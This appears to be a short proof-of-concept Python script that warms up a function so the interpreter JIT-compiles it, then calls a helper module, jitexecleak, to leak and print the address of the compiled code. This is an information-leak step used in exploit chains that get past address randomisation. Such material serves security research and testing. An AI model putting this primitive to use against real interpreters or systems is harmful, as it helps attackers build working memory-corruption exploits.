import jitexecleak

def spray(x):
    acc = 0
    for i in range(100_000):
        acc += x ^ i
    return acc

for _ in range(5000):
    spray(42)

jit_addr = jitexecleak.leak_executor_jit(spray)
print(f"[*] JIT code @ 0x{jit_addr:x}")
